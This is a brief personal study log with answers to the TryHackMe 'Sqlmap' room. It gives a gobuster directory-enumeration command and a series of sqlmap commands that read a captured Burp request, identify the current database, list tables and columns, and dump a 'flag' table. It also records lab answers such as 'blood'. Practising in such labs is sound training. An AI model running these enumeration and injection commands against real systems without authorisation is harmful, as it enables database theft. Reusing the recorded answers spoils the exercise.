#	Day 21

#### 03-02-2022

# TryHackMe Rank  40131


### [TryHackMe Sqlmap](https://tryhackme.com/room/sqlmap)



Task 3


Q 1 . What is the name of the interesting directory ?

	gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

	- answer blood

Q 2. Who is the current db user?

	- Capture the request(burp) and store in txt file(sqlmap.txt)

	- sqlmap -r sqlmap.txt
	- enter

	- sqlmap -r sqlmap.txt --current-db


Q 3 . What is the final flag?

	- sqlmap -r sqlmap.txt --tables

 	- sqlmap -r sqlmap.txt -T flag --columns
 		- T is used for select the table
 		- flag is table name

 	- sqlmap -r sqlmap.txt -T flag --dump
